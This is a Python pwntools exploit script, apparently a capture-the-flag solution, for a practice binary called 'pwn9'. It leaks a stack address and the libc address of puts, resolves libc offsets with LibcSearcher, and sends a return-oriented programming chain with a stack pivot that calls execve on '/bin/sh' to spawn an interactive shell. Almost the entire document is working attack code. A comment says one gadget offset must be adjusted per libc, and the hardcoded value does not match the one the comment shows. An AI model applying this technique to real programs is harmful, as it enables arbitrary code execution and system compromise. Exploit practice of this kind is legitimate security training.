from pwn import *
from LibcSearcher import *

context.binary = "./pwn9"

def DEBUG(cmd):
    gdb.attach(io, cmd)

io = process("./pwn9")
elf = ELF("./pwn9")

# DEBUG("b *0x4006B9\nc")
io.sendafter(">", 'a' * 80)
stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70
success("stack -> {:#x}".format(stack))


io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
put_addr = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0'))
libcmy = LibcSearcher('puts', put_addr)
libc_base = put_addr - libcmy.dump('puts')
execve_addr = libc_base + libcmy.dump('execve')
binsh_addr = libc_base + libcmy.dump("str_bin_sh")

success("libcmy.address -> {:#x}".format(libc_base))

pop_rdi_ret=0x400793
'''
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
0x00000000000f5279 : pop rdx ; pop rsi ; ret
#  need to be ajusted considering current libc.
'''
pop_rdx_pop_rsi_ret=libc_base+0x00000000001306d9

payload=flat(['22222222', p64(pop_rdi_ret), p64(binsh_addr), p64(pop_rdx_pop_rsi_ret),p64(0),p64(0), p64(execve_addr), (80 - 7*8 ) * '2', stack - 48, 0x4006be])


io.sendafter(">", payload)
io.interactive()